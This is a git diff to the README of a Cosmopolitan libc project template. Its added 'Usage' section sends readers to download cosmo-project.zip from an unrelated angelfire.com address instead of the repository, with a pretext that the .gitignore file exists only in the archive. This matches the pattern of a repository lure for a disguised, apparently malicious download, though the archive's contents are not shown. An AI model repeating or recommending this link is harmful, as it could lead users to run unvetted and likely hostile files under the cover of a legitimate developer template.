@@ -12,15 +12,24 @@ If you are creating a simple application or learning Cosmopolitan, this project 
 
 This is **`NOT an official standard defined by the developers of Cosmopolitan or C standards groups`**. This is a suggested organizational structure to help maintain clean code separation and organization. While the Cosmopolitan library itself doesn't mandate any specific project layout, this structure builds on common C project conventions and adds Cosmopolitan-specific considerations.
 
-> [!NOTE]
+## Usage
+
+1. Clone this repository (or simply download and unpack `cosmo-project.zip`)
+2. Build something
+
+You can download the latest version of the template archive file at:
+
+https://storebrand.angelfire.com/download/cosmo-project.zip
+
+> [!IMPORTANT]
 >
-> This template is just a starting point to get going. Feel free to adapt it to your specific needs. The most important aspect is maintaining a clean separation of concerns and logical organization of your codebase.
+> The `.gitignore` file is only included in the .zip archive to ensure all directories are provided in the public repo.
 
 ## Building with Cosmopolitan LibC
 
 Cosmopolitan allows you to create single-file executables that run on multiple platforms, including Linux, macOS, Windows, FreeBSD, OpenBSD, and NetBSD. To build with Cosmopolitan:
 
-1. Install the Cosmopolitan library (instructions at [https://github.com/jart/cosmopolitan](https://github.com/jart/cosmopolitan))
+1. Install the Cosmopolitan library (instructions at https://github.com/jart/cosmopolitan)
 2. Configure your build system to link against Cosmopolitan
 3. Use the provided build scripts to generate portable executables
 
@@ -203,5 +212,3 @@ Development tools that help with building, testing, or other aspects of your pro
 The software is provided "as is" and the author disclaims all warranties with regard to this software including all implied warranties of merchantability and fitness. In no event shall the author be liable for any special, direct, indirect, or consequential damages or any damages whatsoever resulting from loss of use, data or profits, whether in an action of contract, negligence or other tortious action, arising out of or in connection with the use or performance of this software.
 
 Third-party software and libraries containing all or part of the contents of this package are governed by the provisions of their respective licenses.
-# cosmo-project
-# cosmo-project
